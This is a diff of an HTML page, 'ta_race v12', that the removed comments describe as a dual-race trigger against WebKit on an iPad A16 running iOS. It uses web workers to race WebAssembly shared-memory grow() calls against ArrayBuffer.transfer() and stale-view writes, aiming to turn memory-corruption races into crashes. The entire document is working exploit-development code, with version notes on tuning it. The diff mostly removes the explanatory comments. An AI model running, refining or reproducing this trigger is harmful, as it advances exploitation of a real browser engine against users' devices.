@@ -2,128 +2,125 @@
 <html>
 <head>
 <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <title>ta_race v12</title>
+<style>
+body { background:#000; color:#0f0; font-family:monospace; font-size:12px; margin:0; padding:8px; }
+#log { white-space:pre-wrap; word-break:break-all; }
+</style>
 </head>
 <body>
-<pre id="log">ta_race v12 loading...</pre>
+<div id="log">ta_race v12 loading...</div>
 <script>
-// ta_race v12 — dual-race trigger: transferAnchors CAS race + WASM-grow refcount race
-// Target: iPad A16, iOS 27.0.1 (24A446), WebKit.WebContent
-// Changes from v11: 180s auto-reload REMOVED, clone duty 1/4096 @ 64KB max,
-// main-vs-worker threading, usedJSHeapSize telemetry, visibilitychange guard.
+(function(){
+"use strict";
 
-const LOG = document.getElementById('log');
-const t0 = Date.now();
-let it = 0, gens = 0, clones = 0, lastLog = 0;
+var LOG = document.getElementById('log');
+var t0 = Date.now();
+var it = 0, gens = 0, clones = 0, lastLog = 0, heapMB = '?';
 
 function log(msg) {
-  const line = `[${((Date.now()-t0)/1000).toFixed(0)}s it=${it} gens=${gens} clones=${clones} heap=${(performance.memory ? (performance.memory.usedJSHeapSize/1048576).toFixed(1) : '?')}MB] ${msg}`;
+  var line = '[' + ((Date.now()-t0)/1000).toFixed(0) + 's it=' + it + ' gens=' + gens + ' clones=' + clones + ' heap=' + heapMB + 'MB] ' + msg;
   LOG.textContent += '\n' + line;
-  console.log(line);
 }
 
-// visibility guard — if page hides, run is dead
-document.addEventListener('visibilitychange', () => {
-  if (document.hidden) log('!!! PAGE HIDDEN — RUN DEAD !!!');
+document.addEventListener('visibilitychange', function() {
+  if(document.hidden) log('!!! PAGE HIDDEN — RUN DEAD !!!');
 });
 
 // shared WASM memory — the battleground
-const SHARED_MEM = new WebAssembly.Memory({initial: 1, maximum: 128, shared: true});
-const GROW_DELTA = 1; // 64KB per grow — fast cycle, small alloc
+var SHARED_MEM = new WebAssembly.Memory({initial:1, maximum:128, shared:true});
 
-// grow worker: hammers mem.grow() to trigger refreshAfterWasmMemoryGrow race
-const growWorkerSrc = `
-onmessage = function(e) {
-  const mem = e.data;
-  let n = 0;
-  while(true) {
-    try { mem.grow(${GROW_DELTA}); } catch(err) {}
-    n++;
-    if(n % 100000 === 0) postMessage({type:'grow', n:n});
-  }
-};`;
+// grow worker source
+var growSrc = [
+  'onmessage = function(e) {',
+  '  var mem = e.data;',
+  '  var n = 0;',
+  '  while(true) {',
+  '    try { mem.grow(1); } catch(err) {}',
+  '    n++;',
+  '    if(n % 100000 === 0) postMessage({type:"grow", n:n});',
+  '  }',
+  '};'
+].join('\n');
 
-// transfer worker: rings transfer() on views over the same memory
-const transferWorkerSrc = `
-onmessage = function(e) {
-  const mem = e.data;
-  const views = [];
-  for(let i=0; i<96; i++) views.push(new Uint8Array(mem.buffer, 0, 65536));
-  let n = 0;
-  while(true) {
-    for(let i=0; i<96; i++) {
-      try {
-        const ab = views[i].buffer;
-        const t = ab.transfer(); // transferAnchors CAS race target
-        views[i] = new Uint8Array(t, 0, Math.min(65536, t.byteLength));
-      } catch(err) {}
-    }
-    n++;
-    if(n % 10000 === 0) postMessage({type:'transfer', n:n});
-  }
-};`;
+// transfer worker source
+var transferSrc = [
+  'onmessage = function(e) {',
+  '  var mem = e.data;',
+  '  var views = [];',
+  '  for(var i=0; i<96; i++) views.push(new Uint8Array(mem.buffer, 0, 65536));',
+  '  var n = 0;',
+  '  while(true) {',
+  '    for(var i=0; i<96; i++) {',
+  '      try {',
+  '        var ab = views[i].buffer;',
+  '        var t = ab.transfer();',
+  '        views[i] = new Uint8Array(t, 0, Math.min(65536, t.byteLength));',
+  '      } catch(err) {}',
+  '    }',
+  '    n++;',
+  '    if(n % 10000 === 0) postMessage({type:"transfer", n:n});',
+  '  }',
+  '};'
+].join('\n');
 
-const growBlob = new Blob([growWorkerSrc], {type:'application/javascript'});
-const transferBlob = new Blob([transferWorkerSrc], {type:'application/javascript'});
-const growURL = URL.createObjectURL(growBlob);
-const transferURL = URL.createObjectURL(transferBlob);
+var growBlob = new Blob([growSrc], {type:'application/javascript'});
+var transferBlob = new Blob([transferSrc], {type:'application/javascript'});
+var growURL = URL.createObjectURL(growBlob);
+var transferURL = URL.createObjectURL(transferBlob);
 
-const growWorker = new Worker(growURL);
-const transferWorker = new Worker(transferURL);
+var growWorker = new Worker(growURL);
+var transferWorker = new Worker(transferURL);
 
-growWorker.onmessage = (e) => {
+growWorker.onmessage = function(e) {
   if(e.data.type === 'grow') {
     gens = e.data.n;
     if(Date.now() - lastLog > 5000) {
       lastLog = Date.now();
-      log('grow worker alive');
+      if(performance.memory) heapMB = (performance.memory.usedJSHeapSize/1048576).toFixed(1);
+      log('grow alive');
     }
   }
 };
 
-transferWorker.onmessage = (e) => {
+transferWorker.onmessage = function(e) {
   if(e.data.type === 'transfer') {
     it = e.data.n;
     if(Date.now() - lastLog > 5000) {
       lastLog = Date.now();
-      log('transfer worker alive');
+      if(performance.memory) heapMB = (performance.memory.usedJSHeapSize/1048576).toFixed(1);
+      log('transfer alive');
     }
   }
 };
 
-// main thread: stale-view access + rare structuredClone to convert race wins into crashes
-let mainViews = [];
-for(let i=0; i<16; i++) mainViews.push(new Uint8Array(SHARED_MEM.buffer, 0, 65536));
+// main thread: stale-view access + rare structuredClone
+var mainViews = [];
+for(var i=0; i<16; i++) mainViews.push(new Uint8Array(SHARED_MEM.buffer, 0, 65536));
 
 function mainLoop() {
   while(true) {
-    // stale-view access: touch views that grow() may have detached
-    for(let i=0; i<16; i++) {
+    for(var i=0; i<16; i++) {
       try { mainViews[i][0] ^= 0x41; } catch(err) {}
     }
-
-    // rare clone: 1/4096, 64KB slice max — v7 died at 3GB jetsam from clone churn
     if(Math.random() < 1/4096) {
       try {
-        const slice = new Uint8Array(SHARED_MEM.buffer, 0, 65536);
-        structuredClone(slice, {transfer: [slice.buffer]});
+        var slice = new Uint8Array(SHARED_MEM.buffer, 0, 65536);
+        structuredClone(slice, {transfer:[slice.buffer]});
         clones++;
       } catch(err) {}
-    }
-
-    // periodic yield to let workers breathe
-    if(it % 1000 === 0) {
-      // no-op — workers run independent of main loop counter
     }
   }
 }
 
-// kick off
 growWorker.postMessage(SHARED_MEM);
 transferWorker.postMessage(SHARED_MEM);
 
 log('workers spawned, main entering loop');
 mainLoop();
+
+})();
 </script>
 </body>
 </html>
